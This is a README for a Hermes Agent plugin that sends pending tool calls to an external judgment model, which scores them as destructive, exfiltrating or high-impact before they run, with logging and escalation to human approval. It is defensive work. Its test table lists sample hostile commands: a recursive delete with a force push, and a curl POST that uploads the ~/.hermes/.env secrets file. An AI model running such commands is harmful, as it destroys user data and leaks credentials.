# jev-judge

[TypeSafe Jev](https://docs.typesafe.ai) (System One) as a judgment layer for
Hermes Agent: a **pre-tool gate** and a **jev_ask** tool. Jev answers typed
questions (boolean / choice / score) with probabilities — no prose, no parsing.

Adapted from [pi-jev](https://github.com/y0usaf/pi-jev) (Pi coding agent) to
Hermes hooks. Three routes, picked by the `backend` setting (`auto` by
default: `TYPESAFE_API_KEY` wins, else `OPENROUTER_API_KEY`, else `AI_GATEWAY_API_KEY`):

| Route             | Endpoint                                                          | Key                  | Questions                      | Confidence                             | Cost                            |
| ----------------- | ----------------------------------------------------------------- | -------------------- | ------------------------------ | -------------------------------------- | ------------------------------- |
| TypeSafe direto   | `POST https://api.typesafe.ai/v1/systemone` (`model: jev-latest`) | `TYPESAFE_API_KEY`   | `noul` / `choice` / `score`    | inline per answer                      | none (`usage` in tokens)        |
| Vercel AI Gateway | `POST {jev_base_url}/evaluation-model` (`typesafe-ai/jev`)        | `AI_GATEWAY_API_KEY` | `boolean` / `choice` / `score` | `providerMetadata.typesafe.confidence` | `providerMetadata.gateway.cost` |
| OpenRouter        | `POST {openrouter_base_url}/decisions` (`~typesafe/jev-latest`, alpha Decisions API) | `OPENROUTER_API_KEY` | `noul` / `choice` / `score`    | inline per answer (`confidence`)        | none (usage in tokens; billed to your OpenRouter key) |

Yes/no questions are `boolean` internally and mapped to `noul` on the
TypeSafe wire; answers come back normalized (`{probability}` /
`{choice, probabilities, confidence}` / `{score, probabilities, confidence}`).
Pure stdlib, no Node needed.

Exercitada ao vivo nos dois backends (2026-09-21, mesma bateria de 3 calls):

| Tool call                                          | TypeSafe direto                                              | Gateway                     |
| -------------------------------------------------- | ------------------------------------------------------------ | --------------------------- |
| `rm -rf ~/projetos/hermes-jev && git push --force` | destructive 0.95 · exfiltration 0.84 · impact 2.63 (1181 ms) | 0.95 · 0.83 · 2.60 (464 ms) |
| `ls -la ~/projetos/hermes-jev/plugins`             | clear (1010 ms)                                              | clear (411 ms)              |
| `curl -X POST … -d @~/.hermes/.env`                | exfiltration 0.97 · impact 2.98 (866 ms)                     | 0.97 · 2.98 (352 ms)        |

## Install

```bash
hermes plugins install DoGMaTiiC/hermes-jev/plugins/jev-judge
```

## What it does

**Gate** (`pre_tool_call`, shadow by default): before `terminal`, `write_file`
and `patch` run, one Jev request judges them. v1 (default) asks the
inherited triple — _destructive? exfiltration? impact if unwanted?_ —
while `gate_version: v2` (opt-in) asks six separated signals in the same
request (reads_secrets × sends_outbound + blast_radius + self_advocating,
then destructive / impact) and applies a deterministic ladder. Any asked
question without a usable answer fails open as `answer_missing` — never
clear, never 0.0. Every decision lands in a JSONL log.

| Mode               | On a triggered call                                            |
| ------------------ | -------------------------------------------------------------- |
| `shadow` (default) | nothing happens; the decision is logged                        |
| `enforce`          | escalates to Hermes' human-approval gate (`approve` directive) |

**Tool** (`jev_ask`): the model can ask for a typed judgment itself — e.g.
`{"urgent": {"type": "boolean", "instructions": "Does this convey urgency?"}}`.

## Fail-open, always

No key for the selected backend, timeout (3s), HTTP error, malformed body —
the gate returns nothing and the tool call proceeds exactly as today. Logic
is in `gate.judge()`; every question is atomic and thresholds are applied in
code, never by the model.

## Under rate limit

The gateway free tier limits per model; TypeSafe direto has no gateway
limiter. On 429/529 the client reads `Retry-After` (seconds or HTTP date;
garbage and non-finite values like `nan`/`inf` are ignored) and retries
**once** if the wait fits in `retry_max_wait_s` (2.0s) — never in a loop.
After `breaker_threshold` (3) consecutive 429/529s the endpoint goes silent
for `breaker_cooldown_s` (120s); any success resets the count. The breaker
counts one rate-limit event per call, even when the retry is limited too.
Outgoing calls are spaced `min_interval_s` (0.25s) apart per process, and
identical calls share one cached judgment for `cache_seconds` (300s).

Wall-clock budget: `timeout_s` bounds each attempt, so one call with a
retry can take up to ~2×`timeout_s` + `retry_max_wait_s` (~8s at defaults).

## Settings

`plugins.entries.jev-judge.settings` in `config.yaml`:

| Key                                    | Default                                  | Meaning                                                                                             |
| -------------------------------------- | ---------------------------------------- | --------------------------------------------------------------------------------------------------- |
| `mode`                                 | `shadow`                                 | `shadow` = log only · `enforce` = escalate triggered calls                                          |
| `tools`                                | `[terminal, write_file, patch]`          | Tools the gate judges                                                                               |
| `timeout_s`                            | `3.0`                                    | Per-attempt timeout (worst case per call: 2×`timeout_s` + `retry_max_wait_s`)                       |
| `cache_seconds`                        | `300`                                    | Identical calls judged once per window                                                              |
| `backend`                              | `auto`                                   | `auto` = TypeSafe key, else OpenRouter, else gateway · `typesafe`/`openrouter`/`gateway` forces one |
| `typesafe_model` / `typesafe_base_url` | `jev-latest` / `https://api.typesafe.ai` | TypeSafe direto endpoint overrides                                                                  |
| `openrouter_model` / `openrouter_base_url` | `~typesafe/jev-latest` / `https://openrouter.ai/api/alpha` | OpenRouter endpoint overrides (decisions POST to `<base>/decisions`)                         |
| `retry_max_wait_s`                     | `2.0`                                    | Retry once on 429/529 only if Retry-After waits at most this                                        |
| `breaker_threshold`                    | `3`                                      | Consecutive 429/529s before going silent                                                            |
| `breaker_cooldown_s`                   | `120`                                    | Silence window after the breaker opens                                                              |
| `min_interval_s`                       | `0.25`                                   | Minimum gap between outgoing Jev calls, per process                                                 |
| `destructive_threshold`                | `0.90`                                    | P(true) that triggers (v1 and v2)                                                                   |
| `exfiltration_threshold`               | `0.70`                                    | P(true) that triggers (v1 only)                                                                     |
| `impact_threshold`                     | `2.5`                                     | Score that triggers, 0–3 scale (v1 and v2)                                                          |
| `gate_version`                         | `v1`                                      | `v1` = inherited triple · `v2` = 6 separated signals + ladder (opt-in)                              |
| `reads_secrets_threshold`              | `0.70`                                    | P(true) that triggers (v2 only)                                                                     |
| `sends_outbound_threshold`             | `0.70`                                    | P(true) that triggers (v2 only)                                                                     |
| `blast_radius_threshold`               | `2.5`                                     | Score that triggers, 0–3 scale (v2 only)                                                            |
| `self_advocating_threshold`            | `0.70`                                    | P(true) that triggers (v2 only)                                                                     |
| `jev_model` / `jev_base_url`           | `typesafe-ai/jev` / AI Gateway           | Gateway endpoint overrides (prefixed: the loader rejects bare `model`/`base_url`, root is reserved) |
| `log_path`                             | `<HERMES_HOME>/logs/jev-judge.log`       | JSONL decision log                                                                                  |

Needs `TYPESAFE_API_KEY` (direct), `AI_GATEWAY_API_KEY` (Vercel AI
Gateway) and/or `OPENROUTER_API_KEY` (OpenRouter alpha Decisions API). No key
at all: the plugin loads and stays silent (fail-open).

## Advisory signals and joint exfiltration

`advisory_signals` defaults to `[]`. In `enforce` mode, a call whose triggered
signals are all listed proceeds with a `flagged_advisory` log entry. For example,
`advisory_signals: [reads_secrets]` allows a secret read alone. Mixed triggers
still prompt with every triggered signal; `exfiltration` always prompts, even
if listed. Clear, shadow and fail-open outcomes stay unchanged.

For v2, `exfiltration_sends_threshold: 0.6` also triggers `exfiltration` when
`reads_secrets` triggers and `sends_outbound` is at least 0.6. The existing rule
that both signals triggering implies exfiltration still applies. Omit this
setting to retain the existing policy. It must be a finite number in [0, 1];
booleans and strings are invalid. Valid values appear in logged thresholds.
A malformed advisory list (anything other than a list of known signal names)
or an invalid joint threshold disables advisory suppression and records an
`advisory_disabled` reason on escalated calls. v1 thresholds remain unchanged.

## What leaves your machine

Per gated call: one JSON payload with the tool name plus its arguments —
first 12 keys, each value redacted (key-shaped strings masked) and
truncated to 600 chars. Nothing else: no conversation history, no files,
no memory, no tool output. `jev_ask` sends exactly the state and
questions the model provides.
The destination is the selected backend: TypeSafe direct, the Vercel AI
Gateway, or OpenRouter's alpha Decisions API (billed to your OpenRouter key).

Hard limits (#19): a payload above 65536 bytes is refused **without
sending** (fail-open `payload_too_large` — a truncated payload must never
become a favorable verdict); 3xx is never followed (fail-open instead)
and proxy env vars are ignored. Two backends (`typesafe` direto /
gateway, `backend: auto` picks by key); shadow by default; `gate_version`
default v1 (v2 opt-in).

## Verify

```bash
python3 tests/test_offline.py          # offline logic + fail-open, no network
hermes plugins doctor . --ci           # Hermes loader contract
```

Decision log (one JSON line per judgment):

```bash
tail -f "${HERMES_HOME:-$HOME/.hermes}/logs/jev-judge.log"
```

## Prior art

Nothing here claims to be first — each hardening names its source:

- **pi-jev** (Pi coding agent): the original questions and thresholds. v1
  judges the inherited triple (destructive / exfiltration / impact) with
  thresholds fixed in code, never by the model.
- **anpicasso** (`jev-approvals` / `jev-curator`): the v2 shape — separated
  signals (reads_secrets × sends_outbound + blast_radius + self_advocating)
  in one request, a load-bearing ladder order (self-advocacy first so a
  command never talks its way past the gate; the deterministic policy runs
  last and only ever adds), an unanswered question is a failure
  (`answer_missing`, fail-open, never 0.0), and the corpus + metrics
  discipline behind `tools/calibration/judge/` (#21).
- **keeltrace** (Nerve): the contracts / provenance / manifest discipline —
  every decision lands in a JSONL log and the calibration corpus ships a
  `PROVENANCE.json` (counts, seed, corpus SHA-256, question fingerprint).
- **DECRUX9812** (`typesafe-skill-router`) and **xXLODXx** (`skill-router`):
  the router slot was already occupied — our `jev-skill-router` is a
  rebuild with three differences (dual backend, rate-limit hardening,
  published calibration), credited in its own README.
- **Hermes `approval_detection`**: the detection tables copied into the
  corpus builder (#21) — path fragments, `_CMDPOS`, `_hardline_rm_path`,
  `HARDLINE_PATTERNS`, `_SHELL_NAMES`, `DANGEROUS_PATTERNS`. No list of our
  own was invented; the Hermes package is not imported at runtime, and the
  matching here is direct over the normalized command — a documented
  adaptation (see `tools/calibration/judge/corpus.py`).

## Related

- Upstream Hermes work in flight: provider credential listing, bundled skill
  routing plugin, computer-use decision lane (`gh search prs --repo
NousResearch/hermes-agent "jev OR typesafe"`). This plugin is the tool-gate
  counterpart; built to be publishable to the community catalog.
